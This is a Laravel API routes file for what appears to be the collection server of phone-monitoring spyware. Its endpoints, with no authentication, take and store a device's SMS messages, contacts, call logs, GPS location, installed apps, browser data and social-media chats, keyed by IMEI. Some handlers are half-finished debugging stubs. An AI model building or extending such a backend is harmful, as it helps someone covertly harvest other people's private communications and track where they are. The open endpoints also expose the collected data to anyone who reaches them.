<?php

use App\Models\Browser;
use App\Models\Contact;
use App\Models\ContactLog;
use App\Models\Sms;
use App\Models\SocialApp;
use App\Models\App;
use App\Models\Location;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

// Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
//     return $request->user();
// });


    Route::post('browsers', function (Request $request) {
        $browserData = (object) $request->json()->all();
        return Browser::create($request->all);
    });
    Route::post('sms', function(Request $request) {
        $smsData = (object) $request->json()->all();
        Sms::create([
            "imei" => $smsData->imei,
            "contact" => $smsData->address,
            "type" =>  $smsData->type,
            "message" =>  $smsData->msg,
            "date" => $smsData->date,
        ]);

        return response("successful sms entry",200);
    });
    Route::post('contact', function(Request $request) {
        $contactData = (object) $request->json()->all();
        Contact::updateOrCreate([
            "imei"  => $contactData->imei,
            "name"  =>  $contactData->name,
            "phone_number" => $contactData->phoneNumber
        ],[
            "imei"  => $contactData->imei,
            "name"  =>  $contactData->name,
            "phone_number" => $contactData->phoneNumber
        ]);

        return response("Succesful contact entry",200);
    });
    Route::post('call_logs', function(Request $request) {
        $callLogData = (object) $request->json()->all();
        dd($callLogData);
        // ContactLog::updateOrCreate([
        //     "imei" =>  $callLogData->imei,
        //     "name"  =>  $callLogData->name,
        //     "phone_number" =>  $callLogData->phoneNumber,
        //     "duration" =>   $callLogData->duration,
        //     "date"  =>  $callLogData->date,
        //     "type" =>  $callLogData->type,
        // ],[
        //     "imei" =>  $callLogData->imei,
        //     "name"  =>  $callLogData->name,
        //     "phone_number" =>  $callLogData->phoneNumber,
        //     "duration" =>   $callLogData->duration,
        //     "date"  =>  $callLogData->date,
        //     "type" =>  $callLogData->type,
        // ]);
  
        return response("Sucessful Call log entry",200);
    });
    Route::post('location', function (Request $request) {
        $locationData = (object) $request->json()->all();
        // Location::create([
        //     "imei" => $locationData->imei,
        //     "longitude" =>  $locationData->longitude,
        //     "latitude" =>  $locationData->latitude,
        //     "date" => $locationData->date,
        // ]);
        dd("hello");
        return response("Successful location entry",200);
    });
    Route::post('apps', function (Request $request) {
        $appData = (object) $request->json()->all();
        App::updateOrCreate([
            'name'=>$request->name, 
            'imei' =>$request->imei
        ],[
            'name'=>$request->name,
            'imei' =>$request->imei
        ]);
        return response("Successful app entry",200);
    });
    Route::post('social_media',function(Request $request) {
        $socialData = (object) $request->json()->all();

        SocialApp::create([
            "imei"=>$request->imei,
            "contact"=>$request->contact,
            "type"=>$request->type,
            "message"=>$request->message,
            "platform"=>$request->platform,
            "date"=>$request->date
            ]);
        return response("Successful chat message entry",200);
    });



